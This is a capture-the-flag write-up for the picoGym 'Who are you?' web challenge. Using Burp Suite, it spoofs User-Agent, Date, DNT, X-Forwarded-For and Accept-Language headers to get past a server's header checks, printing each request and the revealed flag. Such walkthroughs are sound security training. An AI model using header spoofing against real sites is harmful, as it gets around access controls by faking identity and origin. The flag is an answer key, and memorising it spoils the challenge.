# picoGym Level 142: Who are you?
Source: https://play.picoctf.org/practice/challenge/142

## Goal
Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn<br>
http://mercury.picoctf.net:39114/

## What I learned
```
http headers
```             

## Solution
```
https://webshell.picoctf.org/

# View Page Source
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Who are you?</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
      <div class="jumbotron">
        <p class="lead"></p>
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12">
				<h3 style="color:red">Only people who use the official PicoBrowser are allowed on this site!</h3>
			</div>
		</div>
		<br/>
			<img src="/static/who_r_u.gif"></img>
	</div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>
<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

# Burp Suite
Proxy → Intercept On
Browser: http://mercury.picoctf.net:39114/

GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser 👀
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 42
Referer: http://mercury.picoctf.net:39114/ 👀

# Sorry, this site only worked in 2018.
# Fix w/ Date Header
# Google: http headers
# https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Date

GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 42
Date: 29 Oct 2018 16:56:32 GMT 👀
Referer: http://mercury.picoctf.net:39114/

# I don't trust users who can be tracked.
# Fix w/ DNT Header: Request header that indicates the user's tracking preference (Do Not Track). Deprecated in favor of Global Privacy Control (GPC)

GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 42
DNT: 1 👀
Date: 29 Oct 2018 16:56:32 GMT
Referer: http://mercury.picoctf.net:39114/

# This website is only for people from Sweden.
# Fix w/ X-Forwarded-For
# Google: Sweden IP range
# https://lite.ip2location.com/sweden-ip-address-ranges

GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 42
DNT: 1
Date: 29 Oct 2018 16:56:32 GMT
X-Forwarded-For: 102.177.146.1 👀
Referer: http://mercury.picoctf.net:39114/

# You're in Sweden but you don't speak Swedish?
# Fix w/ Accept-Language header
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Accept-Language: en-US,en;q=0.9, sv 👀
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 42
DNT: 1
Date: 29 Oct 2018 16:56:32 GMT
X-Forwarded-For: 102.177.146.1
Referer: http://mercury.picoctf.net:39114/

Result:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1062

<!DOCTYPE html>
<html lang="en">

<head>
    <title>Who are you?</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
      <div class="jumbotron">
        <p class="lead"></p>
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12">
				<h3 style="color:green">What can I say except, you are welcome</h3>
			</div>
		</div>
		<br/>
			<b>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}</b> 🔐
	</div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>
<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>
</html>
```

## Flag
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}

## Continue
[Continue](./picoGym0200.md)